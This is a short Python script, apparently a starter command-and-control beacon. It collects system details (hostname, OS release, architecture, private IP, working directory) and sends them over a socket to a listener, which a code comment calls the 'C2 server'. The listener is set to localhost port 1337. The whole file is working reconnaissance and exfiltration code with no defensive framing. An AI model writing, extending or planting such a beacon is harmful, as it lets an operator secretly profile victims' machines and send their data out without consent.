import socket
import os

client = socket.socket()

# Gather basic system information using os
system_info = {}
system_info['system'] = os.name
system_info['hostname'] = os.uname().nodename
system_info['release'] = os.uname().release
system_info['version'] = os.uname().version
system_info['architecture'] = os.uname().machine
system_info['private_ip'] = socket.gethostbyname(socket.getfqdn())
system_info['current_directory'] = os.getcwd()

serv_addr = "127.0.0.1"
port = 1337

try:
    client.connect((serv_addr, port))
except Exception as e:
    print("[Error] Is The Host Really Up? Try Checking The Host And Port.")
    print(f"LOG:\n{e}")
    exit(1)

data = '\n'.join(f'{key}: {value}' for key, value in system_info.items())

client.sendall(data.encode())  # Send it to the C2 server

response = client.recv(2048).decode()
print(response)

client.close()
